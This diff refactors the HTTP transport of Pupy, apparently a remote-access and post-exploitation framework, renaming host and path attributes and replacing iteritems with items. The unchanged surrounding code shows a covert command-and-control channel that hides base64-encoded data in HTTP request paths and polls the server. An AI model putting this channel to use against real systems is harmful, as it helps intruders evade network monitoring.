@@ -3,6 +3,7 @@
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
 """ This module contains an implementation of the 'http' transport for pupy. """
+
 from __future__ import absolute_import
 from __future__ import division
 from __future__ import print_function
@@ -64,7 +65,7 @@ class PupyHTTPClient(PupyHTTPTransport):
     payload_max_size = 1024 * 3
 
     __slots__ = (
-        'headers',  'polled', 'host', 'path'
+        'headers', 'polled', '_host', '_path'
     )
 
     def __init__(self, *args, **kwargs):
@@ -76,11 +77,11 @@ class PupyHTTPClient(PupyHTTPTransport):
 
         self.polled = False
 
-        if 'host' in kwargs:
-            self.host = kwargs['host']
+        self._host = kwargs.get('host', getattr(self, 'host'))
+        self._path = kwargs.get('path', getattr(self, 'path'))
 
-        if self.host is not None:
-            self.headers['Host'] = self.host
+        if self._host is not None:
+            self.headers['Host'] = self._host
 
         if 'Host' not in self.headers:
             self.headers['Host'] = '.'.join([
@@ -92,7 +93,7 @@ class PupyHTTPClient(PupyHTTPTransport):
             ])
 
         if 'proxy' in kwargs:
-            self.path = 'http://{}{}'.format(self.headers['Host'], self.path)
+            self._path = 'http://{}{}'.format(self.headers['Host'], self._path)
 
         if 'auth' in kwargs:
             self.headers['Proxy-Authorization'] = \
@@ -103,9 +104,9 @@ class PupyHTTPClient(PupyHTTPTransport):
             d = data.read(self.payload_max_size)
 
             request = b'%s %s%s HTTP/1.1\r\n'%(
-                self.method, self.path, base64.urlsafe_b64encode(d))
+                self.method, self._path, base64.urlsafe_b64encode(d))
 
-            for name, value in self.headers.iteritems():
+            for name, value in self.headers.items():
                 request += b'%s: %s\r\n'%(
                     name.encode('ascii'), value.encode('ascii'))
 
@@ -119,11 +120,11 @@ class PupyHTTPClient(PupyHTTPTransport):
 
                 request += b'%s %s%s HTTP/1.1\r\n'%(
                     self.method.encode('ascii'), 
-                    self.path.encode('ascii'), 
+                    self._path.encode('ascii'), 
                     b'poll&_={}'.format(time.time())
                 )
 
-                for name, value in self.headers.iteritems():
+                for name, value in self.headers.items():
                     request += b'%s: %s\r\n'%(
                         name.encode('ascii'),
                         value.encode('ascii')
@@ -189,11 +190,11 @@ class PupyHTTPClient(PupyHTTPTransport):
 
             request = b'%s %s%s HTTP/1.1\r\n'%(
                 self.method.encode('ascii'),
-                self.path.encode('ascii'), 
+                self._path.encode('ascii'), 
                 b'poll&_={}'.format(time.time())
             )
 
-            for name, value in self.headers.iteritems():
+            for name, value in self.headers.items():
                 request += b'%s: %s\r\n'%(
                     name.encode('ascii'),
                     value.encode('ascii')
@@ -250,7 +251,7 @@ class PupyHTTPServer(PupyHTTPTransport):
 
                         response = b'HTTP/1.1 %s\r\n' % self.response_code.encode('ascii')
 
-                        for name, value in self.headers.iteritems():
+                        for name, value in self.headers.items():
                             response += b'%s: %s\r\n' % (
                                 name.encode('ascii'),
                                 value.encode('ascii')
@@ -289,7 +290,7 @@ class PupyHTTPServer(PupyHTTPTransport):
 
             if encoded_data:
                 response = b'HTTP/1.1 %s\r\n' % self.response_code.encode('ascii')
-                for name, value in self.headers.iteritems():
+                for name, value in self.headers.items():
                     response += b'%s: %s\r\n'%(
                         name.encode('ascii'),
                         value.encode('ascii')
@@ -324,7 +325,7 @@ class PupyHTTPServer(PupyHTTPTransport):
             raise InvalidHTTPReq()
 
         method, path, http_ver=first_line.split()
-        payload = path[len(self.path):]
+        payload = path[len(self._path):]
 
         if payload.startswith(b'poll'):
             return None
@@ -378,7 +379,7 @@ class PupyHTTPServer(PupyHTTPTransport):
             if newdata is not None:
                 response = b'HTTP/1.1 %s\r\n'%self.response_code.encode('ascii')
 
-                for name, value in self.headers.iteritems():
+                for name, value in self.headers.items():
                     response += b'%s: %s\r\n'%(
                         name.encode('ascii'),
                         value.encode('ascii')
@@ -407,7 +408,7 @@ class PupyHTTPServer(PupyHTTPTransport):
 
                     if encoded_data:
                         response = b'HTTP/1.1 %s\r\n'%self.response_code.encode('ascii')
-                        for name, value in self.headers.iteritems():
+                        for name, value in self.headers.items():
                             response += b'%s: %s\r\n'%(
                                 name.encode('ascii'),
                                 value.encode('ascii')
